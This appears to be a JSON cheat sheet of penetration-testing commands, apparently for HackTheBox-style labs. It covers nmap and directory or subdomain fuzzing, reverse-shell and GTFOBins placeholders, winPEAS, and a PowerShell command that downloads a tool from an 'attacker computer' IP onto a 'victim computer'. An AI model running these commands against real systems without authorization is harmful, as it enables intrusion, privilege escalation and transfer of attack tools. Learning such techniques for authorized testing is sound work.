{
    "recon":
    [
        {   
            "command": "nmap -sC -sV -oA [name] [address]",
            "section": "recon",
            "description": "This will save the results in three file formats: '.nmap', '.gmap', and '.xml' (The '.nmap' file will store the output as you would normally see it on the terminal.)"
        },
        {
            "command": "nmap -p- -sC -sV -oA [name] [address]",
            "section": "recon",
            "description": "Similar to the basic nmap scan except it will check all ports, the '-oA' will save it in the three main file formats, you don't have to include this."
        },
        {
            "command": "dirb [url] [wordlist]",
            "section": "recon",
            "description": "Can also utilize the GUI version dirbuster (though I find that to be slower)."
        },
        {
            "command": "gobuster dir -u [address] -w [wordlist] -o [name] -t [threads]",
            "section": "recon",
            "description": "On Kali Linux, wordlists stored under /usr/share/wordlists/. In the example, the '-o' and the '-t' flags are not necessasry."
        },
        {
            "command": "wfuzz --hc 404 -Z -w [wordlist] -u [domain]/FUZZ/[file name]",
            "section": "recon",
            "description": "This situation/example was from a HackTheBox challenge (Obscurity) where it was discovered that there was a file named 'SuperSecureServer.py' in some unknown directory. In this case, I used wfuzz to find what the directory name is. It will replace 'FUZZ' with every word in the wordlists."
        },
        {
            "command": "wfuzz --sc 200 -w [wordlist] -H \"Host: FUZZ.[domain]\" -u [domain]",
            "section": "recon",
            "description": "Needs to have the quotation marks."
        },
        {
            "command": "python3 sublist3r.py -d [domain]",
            "section": "recon",
            "description": "Needs to be installed: sudo git clone https://github.com/aboul3la/Sublist3r /opt/sublist3r"
        },
        {
            "command": "enum4linux [address]",
            "section": "recon",
            "description": "The output is pretty noisy, recommend outputing to file."
        },
        {
            "command": "wpscan --url [address] --enumerate p",
            "section": "recon",
            "description": "[Needs to be vetted] Scans a WordPress website's plugins."
        }
    ],
    
    "init":
    [
        {
            "command": "Start a reverse shell",
            "section": "Initial Access",
            "description": "Needs access to remote code execution."
        },
        {
            "command": "groovy > [temp placement]",
            "section": "Initial Access",
            "description": "second initial access placeholder"
        }
    ],

    "privesc":
    [
        {
            "command": "GTFObins",
            "section": "Privilege Escalation",
            "description" : "Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
        }
    ],

    "discovery":
    [
        {
            "command": "winPEASx86",
            "section": "Discovery",
            "description": "WinPEAS is exclusive to Windows - linPEAS is the linux equiavlent. There is x86 and x64 versions available, do the 'systeminfo' command on cmd.exe to see the computer architecture. There is a lot of output, so would recommend outputting to a file."
        }
    ],

    "file":
    [
        {
            "command": "powershell -c \"Invoke-WebRequest http://10.13.22.171:80/winPEASx86.exe -OutFile winPEASx86.exe\"",
            "section": "Exfiltration/File Movement",
            "description": "Download file from attacker computer to victim computer with powershell on victim pc. This requires attacker computer to have file server - see hosting file server commands. The first part 'powershell -c' is to execute a powershell command/scriptblock from command line. "
        }      
    ]
}